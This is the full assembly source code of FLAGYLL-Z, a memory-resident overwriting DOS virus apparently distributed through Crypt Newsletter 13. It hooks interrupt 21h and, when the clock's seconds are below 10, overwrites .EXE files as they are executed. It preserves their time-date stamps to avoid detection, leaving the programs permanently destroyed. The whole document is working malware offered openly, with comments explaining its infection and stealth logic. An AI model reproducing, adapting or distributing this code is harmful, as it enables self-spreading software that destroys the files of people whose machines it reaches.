;FLAGYLL-Z virus - edited for Crypt Newsletter 13               
;FLAGYLL is a memory resident, overwriting virus which
;infects and destroys .EXE files on load.
;FLAGYLL-Z's infections are modulated by a routine which
;uses the system clock as a random trigger.  When .EXEfiles
;are loaded, FLAGYLL-Z will only infect if the current
;time - in seconds - is below 10.
;FLAGYLL-Z preserves the time-date stamps of infected files.
;.EXE's infected by FLAGYLL-Z are destroyed.  DOS will either
;refuse to load them or FLAGYLL-Z will become resident
;as they execute.  These programs are ruined and can only
;be deleted.
	       
	       
	       .radix 16
     cseg       segment
		model  small
		assume cs:cseg, ds:cseg, es:cseg

		org 100h

oi21            equ endflagyll             
filelength      equ endflagyll - begin     ; virus length
nameptr         equ endflagyll+4
DTA             equ endflagyll+8
	      
begin:          jmp     install_flagyll                              
						 ; install
install_flagyll:  
		
		mov     ax,cs                    ; reduce memory size     
		dec     ax                           
		mov     ds,ax                        
		cmp     byte ptr ds:[0000],5a    ; check if last memory     
		jne     cancel                   ; block     
		mov     ax,ds:[0003]                 
		sub     ax,100                   ; decrease memory     
		mov     ds:0003,ax


copy_flagyll:  
		mov     bx,ax                    ; copy to claimed block  
		mov     ax,es                    ; PSP    
		add     ax,bx                    ; virus start in memory   
		mov     es,ax
		mov     cx,offset endflagyll - begin  ; cx = length of virus                  
		mov     ax,ds                    ; restore ds   
		inc     ax
		mov     ds,ax
		lea     si,ds:[begin]            ; point to start of virus
		lea     di,es:0100               ; point to destination   
		rep     movsb                    ; copy virus in memory   

hook_21:                                     
		
		mov     ds,cx                   ; hook interrupt 21h
		mov     si,0084h                ; 
		mov     di,offset oi21
		mov     dx,offset check_exec
		lodsw
		cmp     ax,dx                   ;
		je      cancel                  ; exit, if already installed
		stosw
		movsw
		
		push    es 
		pop     ds
		mov     ax,2521h               ; revector int 21h to virus
		int     21h
				     
cancel:         ret          

check_exec:                                    ; look over loaded files
		pushf                          ; for executables

		push    es                     ; push everything onto the
		push    ds                     ; stack
		push    ax
		push    bx
		push    dx

		cmp     ax,04B00h               ; is a file being 
						; executed ?
		
		
		jne     abort                   ; no, exit

do_infect:      


		call    infect                ; then try to infect

abort:                                        ; restore everything
		pop     dx
		pop     bx
		pop     ax
		pop     ds
		pop     es
		popf

exit:      
					     ; exit
		jmp     dword ptr cs:[oi21]                     



infect:          
		jmp     over_id               ; it's a vanity thing

note:           db      '-=[Crypt Newsletter 13]=-'


over_id:        
		mov     cs:[name_seg],ds       ; this routine
		mov     cs:[name_off],dx       ; essentially grabs
					       ; the name of the file
		cld                                ; clear direction flags
		mov     word ptr cs:[nameptr],dx ; save pointer to the filename
		mov     word ptr cs:[nameptr+2],ds

		mov     ah,2Fh                    ; get old DTA
		int     21h
		push    es
		push    bx

		push    cs                        ; set new DTA

		pop     ds
		mov     dx,offset DTA
		mov     ah,1Ah
		int     21h

		call    searchpoint              ; find filename for virus
		push    di
		mov     si,offset COM_txt       ; is extension 'COM' ?

		mov     cx,3
	 rep    cmpsb 
		pop     di
		jz      return                  ; if so, let it pass by
		mov     si,offset EXE_txt       ; is extension .EXE ?
		nop
		mov     cl,3
		rep     cmpsb
		jnz     return

		mov     ah,2Ch               ; DOS get system time.                      
		int     21h                  ; <--alter values to suit        
		cmp     dh,10                ; is seconds > 10?
		jg      return               ; if so, be quiet
					     ; this slows down the  
					     ; infection so computing is
					     ; horribly disrupted when the
do_exe:                                      ; virus is in memory
		
		mov     ax,4300h             ; clear attributes
		mov     ds,cs:[name_seg]
		mov     dx,cs:[name_off]
		int     21h
		and     cl,0feh                
		mov     ax,4301h
		int     21h               
		
		mov     ds,cs:[name_seg]   ; open file read/write
		mov     dx,cs:[name_off]
		mov     ax,3D02h             
		int     21h            
		jc      close_file
		push    cs
		pop     ds
		mov     [handle],ax          
		mov     bx,ax               

get_date:       mov     ax,5700h        
		int     21h       
		push    cs
		pop     ds
		mov     [date],dx      
		mov     [time],cx
		
		push    cs
		pop     ds
		mov     ax,4200h          ; move pointer to beginning of file
		
		push    cs
		pop     ds
		mov     bx,[handle]
		xor     cx,cx
		xor     dx,dx
		int     21h
		
		mov     ah,40             ; write to file
		mov     cx,filelength     ; length of Flagyll in CX 
		mov     dx,100            ; start at beginning of Flagyll
		int     21h               ; write Flagyll to file
		
		call    restore_date

close_file:     mov     bx,[handle]
		mov     ah,03Eh           ; close file         
		int     21h
		
		mov     ax,4C00h          ; exit to DOS
		int     21h

return:         mov     ah,1Ah                 
		pop     dx                ; restore old DTA
		pop     ds
		int     21H

		ret                            


searchpoint:    les     di,dword ptr cs:[nameptr]
		mov     ch,0FFh
		mov     al,0
	 repnz  scasb
		sub     di,4
		ret

restore_date:      
		push    cs                       
		pop     ds
		mov     bx,[handle]
		mov     dx,[date]
		mov     cx,[time]
		mov     ax,5701h
		int     21h
		ret


		

EXE_txt         db  'EXE',0      ; extension masks
COM_txt         db  'COM',0      ; for host selection

name_seg        dw  ?            ; data buffers for virus action
name_off        dw  ?            ; on the fly
handle          dw  ?
time            dw  ?
date            dw  ?
note2:           db     'Flagyll-Z' ; virus name

endflagyll:


cseg            ends
		end begin



